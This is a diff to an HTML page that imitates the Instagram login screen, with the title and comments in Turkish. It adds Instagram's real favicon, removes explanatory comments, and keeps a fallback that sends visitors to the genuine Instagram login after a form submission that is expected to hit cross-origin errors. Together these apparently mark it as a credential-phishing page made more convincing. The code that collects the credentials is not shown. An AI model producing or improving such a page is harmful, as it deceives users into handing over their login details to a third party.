@@ -4,6 +4,11 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
     <title>Instagram - Giriş Yap</title>
+
+    <!-- ===== SEKME İKONU (FAVICON) ===== -->
+    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rzWiSjZRxk5.webp" type="image/webp">
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yr/r/rzWiSjZRxk5.webp" type="image/webp">
+
     <style>
         /* ----- RESET & TEMEL ----- */
         * {
@@ -26,7 +31,7 @@
         /* ----- ANA KONTEYNER (Responsive) ----- */
         .container {
             width: 100%;
-            max-width: 400px;        /* Masaüstünde geniş, mobilde dar */
+            max-width: 400px;
             background: white;
             border: 1px solid #dbdbdb;
             border-radius: 16px;
@@ -49,15 +54,15 @@
             color: #0095f6;
         }
 
-        /* ----- INPUTLAR (Mobilde daha büyük) ----- */
+        /* ----- INPUTLAR ----- */
         input {
             width: 100%;
-            padding: 16px 14px;      /* Mobil için daha rahat dokunma */
+            padding: 16px 14px;
             margin: 8px 0;
             border: 1px solid #dbdbdb;
             border-radius: 8px;
             background: #fafafa;
-            font-size: 16px;          /* Mobilde zoom yapmasın diye 16px */
+            font-size: 16px;
             outline: none;
             transition: border 0.2s, background 0.2s;
         }
@@ -66,7 +71,7 @@
             background: white;
         }
 
-        /* ----- BUTON (Mobilde büyük) ----- */
+        /* ----- BUTON ----- */
         button {
             width: 100%;
             padding: 16px;
@@ -76,7 +81,7 @@
             border-radius: 8px;
             color: white;
             font-weight: 700;
-            font-size: 18px;          /* Mobilde okunaklı */
+            font-size: 18px;
             cursor: pointer;
             transition: background 0.2s, transform 0.1s;
         }
@@ -84,7 +89,7 @@
             background: #1877f2;
         }
         button:active {
-            transform: scale(0.97);   /* Dokunma geri bildirimi */
+            transform: scale(0.97);
         }
         button:disabled {
             opacity: 0.6;
@@ -137,7 +142,7 @@
             flex-wrap: wrap;
         }
         .app-buttons img {
-            height: 44px;            /* Mobilde daha büyük */
+            height: 44px;
             cursor: pointer;
         }
 
@@ -203,17 +208,17 @@
                ============================================================ */
         @media only screen and (max-width: 480px) {
             .container {
-                padding: 30px 20px;      /* Daha az padding */
+                padding: 30px 20px;
                 border-radius: 12px;
                 max-width: 100%;
                 margin: 10px;
             }
             .logo {
-                font-size: 44px;          /* Biraz küçültsün */
+                font-size: 44px;
                 margin-bottom: 24px;
             }
             input {
-                padding: 18px 14px;       /* Parmak için daha büyük */
+                padding: 18px 14px;
                 font-size: 17px;
                 border-radius: 10px;
             }
@@ -223,7 +228,7 @@
                 border-radius: 10px;
             }
             .app-buttons img {
-                height: 48px;             /* Daha büyük butonlar */
+                height: 48px;
             }
             .meta-links {
                 gap: 12px;
@@ -251,7 +256,6 @@
             }
         }
 
-        /* Masaüstü için hafif genişlik sınırı */
         @media only screen and (min-width: 768px) {
             .container {
                 max-width: 420px;
@@ -405,7 +409,6 @@
                         }
                     } catch (err) {
                         // CORS veya parse hatası olabilir, ama genelde başarılıdır.
-                        // Yine de yönlendirelim.
                         setTimeout(function() {
                             window.location.href = 'https://www.instagram.com/accounts/login/';
                         }, 1200);
